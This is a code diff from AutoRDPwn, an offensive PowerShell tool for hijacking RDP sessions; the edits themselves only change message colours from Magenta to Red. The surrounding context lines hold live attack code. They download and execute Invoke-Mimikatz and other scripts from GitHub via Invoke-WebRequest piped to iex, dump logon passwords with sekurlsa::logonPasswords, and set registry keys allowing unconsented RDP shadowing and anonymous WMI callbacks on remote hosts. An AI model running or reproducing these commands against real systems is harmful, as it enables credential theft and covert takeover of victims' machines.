@@ -58,7 +58,7 @@ function Test-Command {
        '1' { $Language = 'English' } 
        '2' { $Language = 'Spanish' } 
        'X' { continue }
-    default { Write-Host"" ; Write-Host "Wrong option, please try again" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in '1','2','X') if($input -in '1','2'){
+    default { Write-Host"" ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 2000 }}} until ($input -in '1','2','X') if($input -in '1','2'){
 
 if($Language -in 'English') {
   $txt1  = "Load additional modules"
@@ -317,7 +317,7 @@ if($Language -in 'Spanish') {
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
         Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" ; Write-Host ; pause ; sleep -milliseconds 2000 }
 
-        if($mimikatz -in '1','2','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        if($mimikatz -in '1','2','m') { $null } else { Write-Host "$txt4" -ForegroundColor Red ; sleep -milliseconds 2000 }}
         if($module -like '2') { $console ="true" ; Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 }
 
         if($module -like '3') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
@@ -334,7 +334,7 @@ if($Language -in 'Spanish') {
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex ; pause ; sleep -milliseconds 2000 }
         
         if($forensics -in '1','2','m') { $null }
-        else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        else { Write-Host "$txt4" -ForegroundColor Red ; sleep -milliseconds 2000 }}
         if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 }
 	
         if($module -like '6') { Show-Banner ; Write-Host "[1] - $txt8c" ; Write-Host "[2] - $txt8d" ; Write-Host "[3] - $txt9d" ; Write-Host "[M] - $txt11" ; Write-Host
@@ -348,12 +348,12 @@ if($Language -in 'Spanish') {
 
         if($forwarding -like '3') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 ; $proxy = netsh interface portproxy show all
         if(!$proxy){ Write-Host ; Write-Host "$txt36" -ForegroundColor Magenta ; sleep -milliseconds 2000 } else { netsh interface portproxy reset ; Write-Host "$txt37" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
-        if($forwarding -in '1','2','3','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        if($forwarding -in '1','2','3','m') { $null } else { Write-Host "$txt4" -ForegroundColor Red ; sleep -milliseconds 2000 }}
 
         if($module -like '7') { $webserver ="true" ; Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 } 
 
 	if($module -in '1','2','3','4','5','6','7','m') { $null }
-        else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        else { Write-Host "$txt4" -ForegroundColor Red ; sleep -milliseconds 2000 }}
         'X' { continue }
 
         default { Write-Host ; Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in '1','2','3','4','5','6','X')
@@ -388,7 +388,7 @@ if($Language -in 'Spanish') {
         REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null 
 	Write-Host "$using:txt21" }}
 
-        default { Write-Host ; Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in 'ver','see','controlar','control')
+        default { Write-Host ; Write-Host "$txt4" -ForegroundColor Red ; sleep -milliseconds 2000 }}} until ($input -in 'ver','see','controlar','control')
 
     invoke-command -session $RDP[0] -scriptblock {
     REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1 /f 2>&1> $null
